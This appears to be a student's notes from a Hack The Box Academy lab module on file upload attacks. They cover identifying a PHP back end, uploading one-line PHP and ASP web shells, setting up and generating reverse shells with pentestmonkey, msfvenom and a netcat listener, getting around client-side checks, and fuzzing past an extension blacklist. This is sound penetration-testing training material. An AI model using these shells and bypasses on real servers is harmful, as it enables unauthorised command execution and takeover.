# Intro to File Upload Attacks

Uploading user files has become a key feature for most modern web applications to allow the extensibility of web applications with user information. A social media website allows the upload of user profile images and other social media, while a corporate website may allow users to upload PDFs and other documents for corporate use.

However, as web application developers enable this feature, they also take the risk of allowing end-users to store their potentially malicious data on the web application's back-end server. If the user input and uploaded files are not correctly filtered and validated, attackers may be able to exploit the file upload feature to perform malicious activities, like executing arbitrary commands on the back-end server to take control over it.

File upload vulnerabilities are amongst the most common vulnerabilities found in web and mobile applications, as we can see in the latestÂ [CVE Reports](https://www.cvedetails.com/vulnerability-list/cweid-434/vulnerabilities.html). We will also notice that most of these vulnerabilities are scored asÂ `High`Â orÂ `Critical`Â vulnerabilities, showing the level of risk caused by insecure file upload.

## Types of File Upload Attacks

The most common reason behind file upload vulnerabilities is weak file validation and verification, which may not be well secured to prevent unwanted file types or could be missing altogether. The worst possible kind of file upload vulnerability is anÂ `unauthenticated arbitrary file upload`Â vulnerability. With this type of vulnerability, a web application allows any unauthenticated user to upload any file type, making it one step away from allowing any user to execute code on the back-end server.

Many web developers employ various types of tests to validate the extension or content of the uploaded file. However, as we will see in this module, if these filters are not secure, we may be able to bypass them and still reach arbitrary file uploads to perform our attacks.

The most common and critical attack caused by arbitrary file uploads isÂ `gaining remote command execution`Â over the back-end server by uploading a web shell or uploading a script that sends a reverse shell. A web shell, as we will discuss in the next section, allows us to execute any command we specify and can be turned into an interactive shell to enumerate the system easily and further exploit the network. It may also be possible to upload a script that sends a reverse shell to a listener on our machine and then interact with the remote server that way.

In some cases, we may not have arbitrary file uploads and may only be able to upload a specific file type. Even in these cases, there are various attacks we may be able to perform to exploit the file upload functionality if certain security protections were missing from the web application.

Examples of these attacks include:

- Introducing other vulnerabilities likeÂ `XSS`Â orÂ `XXE`.
- Causing aÂ `Denial of Service (DoS)`Â on the back-end server.
- Overwriting critical system files and configurations.
- And many others.

Finally, a file upload vulnerability is not only caused by writing insecure functions but is also often caused by the use of outdated libraries that may be vulnerable to these attacks. 

# Absent Validation

The most basic type of file upload vulnerability occurs when the web applicationÂ `does not have any form of validation filters`Â on the uploaded files, allowing the upload of any file type by default.

With these types of vulnerable web apps, we may directly upload our web shell or reverse shell script to the web application, and then by just visiting the uploaded script, we can interact with our web shell or send the reverse shell.

## Arbitrary File Upload

Let's start the exercise at the end of this section, and we will see anÂ `Employee File Manager`Â web application, which allows us to upload personal files to the web application:

![](Pasted%20image%2020250219161919.png)

The web application does not mention anything about what file types are allowed, and we can drag and drop any file we want, and its name will appear on the upload form, includingÂ `.php`Â files:

![](Pasted%20image%2020250219161928.png)

Furthermore, if we click on the form to select a file, the file selector dialog does not specify any file type, as it saysÂ `All Files`Â for the file type, which may also suggest that no type of restrictions or limitations are specified for the web application:

![](Pasted%20image%2020250219161935.png)

All of this tells us that the program appears to have no file type restrictions on the front-end, and if no restrictions were specified on the back-end, we might be able to upload arbitrary file types to the back-end server to gain complete control over it.

## Identifying Web Framework

We need to upload a malicious script to test whether we can upload any file type to the back-end server and test whether we can use this to exploit the back-end server. Many kinds of scripts can help us exploit web applications through arbitrary file upload, most commonly aÂ `Web Shell`Â script and aÂ `Reverse Shell`Â script.

A Web Shell provides us with an easy method to interact with the back-end server by accepting shell commands and printing their output back to us within the web browser. A web shell has to be written in the same programming language that runs the web server, as it runs platform-specific functions and commands to execute system commands on the back-end server, making web shells non-cross-platform scripts. So, the first step would be to identify what language runs the web application.

This is usually relatively simple, as we can often see the web page extension in the URLs, which may reveal the programming language that runs the web application. However, in certain web frameworks and web languages,Â `Web Routes`Â are used to map URLs to web pages, in which case the web page extension may not be shown. Furthermore, file upload exploitation would also be different, as our uploaded files may not be directly routable or accessible.

One easy method to determine what language runs the web application is to visit theÂ `/index.ext`Â page, where we would swap outÂ `ext`Â with various common web extensions, likeÂ `php`,Â `asp`,Â `aspx`, among others, to see whether any of them exist.

For example, when we visit our exercise below, we see its URL asÂ `http://SERVER_IP:PORT/`, as theÂ `index`Â page is usually hidden by default. But, if we try visitingÂ `http://SERVER_IP:PORT/index.php`, we would get the same page, which means that this is indeed aÂ `PHP`Â web application. We do not need to do this manually, of course, as we can use a tool like Burp Intruder for fuzzing the file extension using aÂ [Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)Â wordlist, as we will see in upcoming sections. This method may not always be accurate, though, as the web application may not utilize index pages or may utilize more than one web extension.

Several other techniques may help identify the technologies running the web application, like using theÂ [Wappalyzer](https://www.wappalyzer.com/)Â extension, which is available for all major browsers. Once added to our browser, we can click its icon to view all technologies running the web application:

![](Pasted%20image%2020250219162103.png)

As we can see, not only did the extension tell us that the web application runs onÂ `PHP`, but it also identified the type and version of the web server, the back-end operating system, and other technologies in use. These extensions are essential in a web penetration tester's arsenal, though it is always better to know alternative manual methods to identify the web framework, like the earlier method we discussed.

We may also run web scanners to identify the web framework, like Burp/ZAP scanners or other Web Vulnerability Assessment tools. In the end, once we identify the language running the web application, we may upload a malicious script written in the same language to exploit the web application and gain remote control over the back-end server.

## Vulnerability Identification

Now that we have identified the web framework running the web application and its programming language, we can test whether we can upload a file with the same extension. As an initial test to identify whether we can upload arbitraryÂ `PHP`Â files, let's create a basicÂ `Hello World`Â script to test whether we can executeÂ `PHP`Â code with our uploaded file.

To do so, we will writeÂ `<?php echo "Hello HTB";?>`Â toÂ `test.php`, and try uploading it to the web application:

![](Pasted%20image%2020250219162430.png)

The file appears to have successfully been uploaded, as we get a message sayingÂ `File successfully uploaded`, which means thatÂ `the web application has no file validation whatsoever on the back-end`. Now, we can click theÂ `Download`Â button, and the web application will take us to our uploaded file:

![](Pasted%20image%2020250219162438.png)

As we can see, the page prints ourÂ `Hello HTB`Â message, which means that theÂ `echo`Â function was executed to print our string, and we successfully executedÂ `PHP`Â code on the back-end server. If the page could not run PHP code, we would see our source code printed on the page.

In the next section, we will see how to exploit this vulnerability to execute code on the back-end server and take control over it.

>[!Example]
>Upload a file that executes the command `hostname`:
>
>```php
><?php echo exec('hostname');?>
>```

# Upload Exploitation

The final step in exploiting this web application is to upload the malicious script in the same language as the web application, like a web shell or a reverse shell script. Once we upload our malicious script and visit its link, we should be able to interact with it to take control over the back-end server.

## Web Shells

We can find many excellent web shells online that provide useful features, like directory traversal or file transfer. One good option forÂ `PHP`Â isÂ [phpbash](https://github.com/Arrexel/phpbash), which provides a terminal-like, semi-interactive web shell. Furthermore,Â [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells)Â provides a plethora of web shells for different frameworks and languages, which can be found in theÂ `/opt/useful/seclists/Web-Shells`Â directory inÂ `PwnBox`.

We can download any of these web shells for the language of our web application (`PHP`Â in our case), then upload it through the vulnerable upload feature, and visit the uploaded file to interact with the web shell. For example, let's try to uploadÂ `phpbash.php`Â fromÂ [phpbash](https://github.com/Arrexel/phpbash)Â to our web application, and then navigate to its link by clicking on the Download button:

![](Pasted%20image%2020250219163037.png)

As we can see, this web shell provides a terminal-like experience, which makes it very easy to enumerate the back-end server for further exploitation. Try a few other web shells from SecLists, and see which ones best meet your needs.

## Writing Custom Web Shell

Although using web shells from online resources can provide a great experience, we should also know how to write a simple web shell manually. This is because we may not have access to online tools during some penetration tests, so we need to be able to create one when needed.

For example, withÂ `PHP`Â web applications, we can use theÂ `system()`Â function that executes system commands and prints their output, and pass it theÂ `cmd`Â parameter withÂ `$_REQUEST['cmd']`, as follows:

```php
<?php system($_REQUEST['cmd']); ?>
```

If we write the above script toÂ `shell.php`Â and upload it to our web application, we can execute system commands with theÂ `?cmd=`Â GET parameter (e.g.Â `?cmd=id`), as follows:

![](Pasted%20image%2020250219163234.png)

This may not be as easy to use as other web shells we can find online, but it still provides an interactive method for sending commands and retrieving their output. It could be the only available option during some web penetration tests.

>[!Tip]
>If we are using this custom web shell in a browser, it may be best to use source-view by clickingÂ `[CTRL+U]`, as the source-view shows the command output as it would be shown in the terminal, without any HTML rendering that may affect how the output is formatted.

Web shells are not exclusive toÂ `PHP`, and the same applies to other web frameworks, with the only difference being the functions used to execute system commands. ForÂ `.NET`Â web applications, we can pass theÂ `cmd`Â parameter withÂ `request('cmd')`Â to theÂ `eval()`Â function, and it should also execute the command specified inÂ `?cmd=`Â and print its output, as follows:

```asp
<% eval request('cmd') %>
```

We can find various other web shells online, many of which can be easily memorized for web penetration testing purposes. It must be noted thatÂ `in certain cases, web shells may not work`. This may be due to the web server preventing the use of some functions utilized by the web shell (e.g.Â `system()`), or due to a Web Application Firewall, among other reasons. In these cases, we may need to use advanced techniques to bypass these security mitigations, but this is outside the scope of this module.

## Reverse Shell

Finally, let's see how we can receive reverse shells through the vulnerable upload functionality. To do so, we should start by downloading a reverse shell script in the language of the web application. One reliable reverse shell forÂ `PHP`Â is theÂ [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell)Â PHP reverse shell. Furthermore, the sameÂ [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells)Â we mentioned earlier also contains reverse shell scripts for various languages and web frameworks, and we can utilize any of them to receive a reverse shell as well.

Let's download one of the above reverse shell scripts, like theÂ [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell), and then open it in a text editor to input ourÂ `IP`Â and listeningÂ `PORT`, which the script will connect to. For theÂ `pentestmonkey`Â script, we can modify linesÂ `49`Â andÂ `50`Â and input our machine's IP/PORT:

```php
$ip = 'OUR_IP';     // CHANGE THIS
$port = OUR_PORT;   // CHANGE THIS
```

Next, we can start aÂ `netcat`Â listener on our machine (with the above port), upload our script to the web application, and then visit its link to execute the script and get a reverse shell connection:

```shell
gitblanc@htb[/htb]$ nc -lvnp OUR_PORT
listening on [any] OUR_PORT ...
connect to [OUR_IP] from (UNKNOWN) [188.166.173.208] 35232
# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

As we can see, we successfully received a connection back from the back-end server that hosts the vulnerable web application, which allows us to interact with it for further exploitation. The same concept can be used for other web frameworks and languages, with the only difference being the reverse shell script we use.

## Generating Custom Reverse Shell Scripts

Just like web shells, we can also create our own reverse shell scripts. While it is possible to use the same previousÂ `system`Â function and pass it a reverse shell command, this may not always be very reliable, as the command may fail for many reasons, just like any other reverse shell command.

This is why it is always better to use core web framework functions to connect to our machine. However, this may not be as easy to memorize as a web shell script. Luckily, tools likeÂ `msfvenom`Â can generate a reverse shell script in many languages and may even attempt to bypass certain restrictions in place. We can do so as follows forÂ `PHP`:

```shell
gitblanc@htb[/htb]$ msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
...SNIP...
Payload size: 3033 bytes
```

Once ourÂ `reverse.php`Â script is generated, we can once again start aÂ `netcat`Â listener on the port we specified above, upload theÂ `reverse.php`Â script and visit its link, and we should receive a reverse shell as well:

```shell
gitblanc@htb[/htb]$ nc -lvnp OUR_PORT
listening on [any] OUR_PORT ...
connect to [OUR_IP] from (UNKNOWN) [181.151.182.286] 56232
# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Similarly, we can generate reverse shell scripts for several languages. We can use many reverse shell payloads with theÂ `-p`Â flag and specify the output language with theÂ `-f`Â flag.

While reverse shells are always preferred over web shells, as they provide the most interactive method for controlling the compromised server, they may not always work, and we may have to rely on web shells instead. This can be for several reasons, like having a firewall on the back-end network that prevents outgoing connections or if the web server disables the necessary functions to initiate a connection back to us.

# Client-Side Validation

Many web applications only rely on front-end JavaScript code to validate the selected file format before it is uploaded and would not upload it if the file is not in the required format (e.g., not an image).

However, as the file format validation is happening on the client-side, we can easily bypass it by directly interacting with the server, skipping the front-end validations altogether. We may also modify the front-end code through our browser's dev tools to disable any validation in place.

## Client-Side Validation

The exercise at the end of this section shows a basicÂ `Profile Image`Â functionality, frequently seen in web applications that utilize user profile features, like social media web applications:

![](Pasted%20image%2020250219164304.png)

However, this time, when we get the file selection dialog, we cannot see ourÂ `PHP`Â scripts (or it may be greyed out), as the dialog appears to be limited to image formats only:

![](Pasted%20image%2020250219164311.png)

We may still select theÂ `All Files`Â option to select ourÂ `PHP`Â script anyway, but when we do so, we get an error message saying (`Only images are allowed!`), and theÂ `Upload`Â button gets disabled:

![](Pasted%20image%2020250219164318.png)

This indicates some form of file type validation, so we cannot just upload a web shell through the upload form as we did in the previous section. ==Luckily, all validation appears to be happening on the front-end, as the page never refreshes or sends any HTTP requests after selecting our file==. So, we should be able to have complete control over these client-side validations.

Any code that runs on the client-side is under our control. While the web server is responsible for sending the front-end code, the rendering and execution of the front-end code happen within our browser. If the web application does not apply any of these validations on the back-end, we should be able to upload any file type.

As mentioned earlier, to bypass these protections, we can eitherÂ `modify the upload request to the back-end server`, or we canÂ `manipulate the front-end code to disable these type validations`.

## Back-end Request Modification

Let's start by examining a normal request throughÂ `Burp`. When we select an image, we see that it gets reflected as our profile image, and when we click onÂ `Upload`, our profile image gets updated and persists through refreshes. This indicates that our image was uploaded to the server, which is now displaying it back to us:

![](Pasted%20image%2020250219164621.png)

If we capture the upload request withÂ `Burp`, we see the following request being sent by the web application:

![](Pasted%20image%2020250219164628.png)

The web application appears to be sending a standard HTTP upload request toÂ `/upload.php`. This way, we can now modify this request to meet our needs without having the front-end type validation restrictions. If the back-end server does not validate the uploaded file type, then we should theoretically be able to send any file type/content, and it would be uploaded to the server.

The two important parts in the request areÂ `filename="HTB.png"`Â and the file content at the end of the request. If we modify theÂ `filename`Â toÂ `shell.php`Â and modify the content to the web shell we used in the previous section; we would be uploading aÂ `PHP`Â web shell instead of an image.

So, let's capture another image upload request, and then modify it accordingly:

![](Pasted%20image%2020250219164639.png)

>[!Note]
>We may also modify theÂ `Content-Type`Â of the uploaded file, though this should not play an important role at this stage, so we'll keep it unmodified.

As we can see, our upload request went through, and we gotÂ `File successfully uploaded`Â in the response. So, we may now visit our uploaded file and interact with it and gain remote code execution.

## Disabling Front-end Validation

Another method to bypass client-side validations is through manipulating the front-end code. As these functions are being completely processed within our web browser, we have complete control over them. So, we can modify these scripts or disable them entirely. Then, we may use the upload functionality to upload any file type without needing to utilizeÂ `Burp`Â to capture and modify our requests.

To start, we can click `[CTRL+SHIFT+C]` to toggle the browser'sÂ `Page Inspector`, and then click on the profile image, which is where we trigger the file selector for the upload form:

![](Pasted%20image%2020250219164920.png)

This will highlight the following HTML file input on lineÂ `18`:

```html
<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
```

Here, we see that the file input specifies (`.jpg,.jpeg,.png`) as the allowed file types within the file selection dialog. However, we can easily modify this and selectÂ `All Files`Â as we did before, so it is unnecessary to change this part of the page.

The more interesting part isÂ `onchange="checkFile(this)"`, which appears to run a JavaScript code whenever we select a file, which appears to be doing the file type validation. To get the details of this function, we can go to the browser'sÂ `Console`Â by clicking `[CTRL+SHIFT+K]`, and then we can type the function's name (`checkFile`) to get its details:

```javascript
function checkFile(File) {
...SNIP...
    if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
        $('#error_message').text("Only images are allowed!");
        File.form.reset();
        $("#submit").attr("disabled", true);
    ...SNIP...
    }
}
```

The key thing we take from this function is where it checks whether the file extension is an image, and if it is not, it prints the error message we saw earlier (`Only images are allowed!`) and disables theÂ `Upload`Â button. We can addÂ `PHP`Â as one of the allowed extensions or modify the function to remove the extension check.

Luckily, we do not need to get into writing and modifying JavaScript code. We can remove this function from the HTML code since its primary use appears to be file type validation, and removing it should not break anything.

To do so, we can go back to our inspector, click on the profile image again, double-click on the function name (`checkFile`) on lineÂ `18`, and delete it:

![](Pasted%20image%2020250219164942.png)

>[!Tip]
>You may also do the same to removeÂ `accept=".jpg,.jpeg,.png"`, which should make selecting theÂ `PHP`Â shell easier in the file selection dialog, though this is not mandatory, as mentioned earlier.

With theÂ `checkFile`Â function removed from the file input, we should be able to select ourÂ `PHP`Â web shell through the file selection dialog and upload it normally with no validations, similar to what we did in the previous section.

>[!Note]
>The modification we made to the source code is temporary and will not persist through page refreshes, as we are only changing it on the client-side. However, our only need is to bypass the client-side validation, so it should be enough for this purpose.

Once we upload our web shell using either of the above methods and then refresh the page, we can use theÂ `Page Inspector`Â once more with `[CTRL+SHIFT+C]`, click on the profile image, and we should see the URL of our uploaded web shell:

```html
<img src="/profile_images/shell.php" class="profile-image" id="profile-image">
```

If we can click on the above link, we will get to our uploaded web shell, which we can interact with to execute commands on the back-end server:

![](Pasted%20image%2020250219165002.png)

>[!Example]
>In the Academy exercise you should eliminate the `if{validate()}` to make it work just by modifying the front-end. Otherwise, it's so easy with Burp.

![](Pasted%20image%2020250219170526.png)

# Blacklist Filters

In the previous section, we saw an example of a web application that only applied type validation controls on the front-end (i.e., client-side), which made it trivial to bypass these controls. This is why it is always recommended to implement all security-related controls on the back-end server, where attackers cannot directly manipulate it.

Still, if the type validation controls on the back-end server were not securely coded, an attacker can utilize multiple techniques to bypass them and reach PHP file uploads.

The exercise we find in this section is similar to the one we saw in the previous section, but it has a blacklist of disallowed extensions to prevent uploading web scripts. We will see why using a blacklist of common extensions may not be enough to prevent arbitrary file uploads and discuss several methods to bypass it.

## Blacklisting Extensions

Let's start by trying one of the client-side bypasses we learned in the previous section to upload a PHP script to the back-end server. We'll intercept an image upload request with Burp, replace the file content and filename with our PHP script's, and forward the request:

![](Pasted%20image%2020250219170744.png)

As we can see, our attack did not succeed this time, as we gotÂ `Extension not allowed`. This indicates that the web application may have some form of file type validation on the back-end, in addition to the front-end validations.

There are generally two common forms of validating a file extension on the back-end:

1. Testing against aÂ `blacklist`Â of types
2. Testing against aÂ `whitelist`Â of types

Furthermore, the validation may also check theÂ `file type`Â or theÂ `file content`Â for type matching. The weakest form of validation amongst these isÂ `testing the file extension against a blacklist of extension`Â to determine whether the upload request should be blocked. For example, the following piece of code checks if the uploaded file extension isÂ `PHP`Â and drops the request if it is:

```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    echo "File type not allowed";
    die();
}
```

The code is taking the file extension (`$extension`) from the uploaded file name (`$fileName`) and then comparing it against a list of blacklisted extensions (`$blacklist`). However, this validation method has a major flaw.Â `It is not comprehensive`, as many other extensions are not included in this list, which may still be used to execute PHP code on the back-end server if uploaded.

>[!Tip]
>The comparison above is also case-sensitive, and is only considering lowercase extensions. In Windows Servers, file names are case insensitive, so we may try uploading aÂ `php`Â with a mixed-case (e.g.Â `pHp`), which may bypass the blacklist as well, and should still execute as a PHP script.

So, let's try to exploit this weakness to bypass the blacklist and upload a PHP file.

## Fuzzing Extensions

As the web application seems to be testing the file extension, our first step is to fuzz the upload functionality with a list of potential extensions and see which of them return the previous error message. Any upload requests that do not return an error message, return a different message, or succeed in uploading the file, may indicate an allowed file extension.

There are many lists of extensions we can utilize in our fuzzing scan.Â `PayloadsAllTheThings`Â provides lists of extensions forÂ [PHP](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)Â andÂ [.NET](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP)Â web applications. We may also useÂ `SecLists`Â list of commonÂ [Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt).

We may use any of the above lists for our fuzzing scan. As we are testing a PHP application, we will download and use the aboveÂ [PHP](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)Â list. Then, fromÂ `Burp History`, we can locate our last request toÂ `/upload.php`, right-click on it, and selectÂ `Send to Intruder`. From theÂ `Positions`Â tab, we canÂ `Clear`Â any automatically set positions, and then select theÂ `.php`Â extension inÂ `filename="HTB.php"`Â and click theÂ `Add`Â button to add it as a fuzzing position:

![](Pasted%20image%2020250219171130.png)

We'll keep the file content for this attack, as we are only interested in fuzzing file extensions. Finally, we canÂ `Load`Â the PHP extensions list from above in theÂ `Payloads`Â tab underÂ `Payload Options`. We will also un-tick theÂ `URL Encoding`Â option to avoid encoding the (`.`) before the file extension. Once this is done, we can click onÂ `Start Attack`Â to start fuzzing for file extensions that are not blacklisted:

![](Pasted%20image%2020250219171137.png)

We can sort the results byÂ `Length`, and we will see that all requests with the Content-Length (`193`) passed the extension validation, as they all responded withÂ `File successfully uploaded`. In contrast, the rest responded with an error message sayingÂ `Extension not allowed`.

## Non-Blacklisted Extensions

Now, we can try uploading a file using any of theÂ `allowed extensions`Â from above, and some of them may allow us to execute PHP code.Â `Not all extensions will work with all web server configurations`, so we may need to try several extensions to get one that successfully executes PHP code.

Let's use theÂ `.phtml`Â extension, which PHP web servers often allow for code execution rights. We can right-click on its request in the Intruder results and selectÂ `Send to Repeater`. Now, all we have to do is repeat what we have done in the previous two sections by changing the file name to use theÂ `.phtml`Â extension and changing the content to that of a PHP web shell:

As we can see, our file seems to have indeed been uploaded. The final step is to visit our upload file, which should be under the image upload directory (`profile_images`), as we saw in the previous section. Then, we can test executing a command, which should confirm that we successfully bypassed the blacklist and uploaded our web shell:

>[!Example]
>For the academy exercise of this section I'll use this `php` web shell and `/usr/share/seclists/Discovery/Web-Content/web-extensions.txt` as wordlist:

```php
<?php echo "PWNED"; ?>
```

With `.phar` worked:

So I'll change the payload to a web shell:

```php
<?php SYSTEM($_REQUEST['cmd']); ?>
```
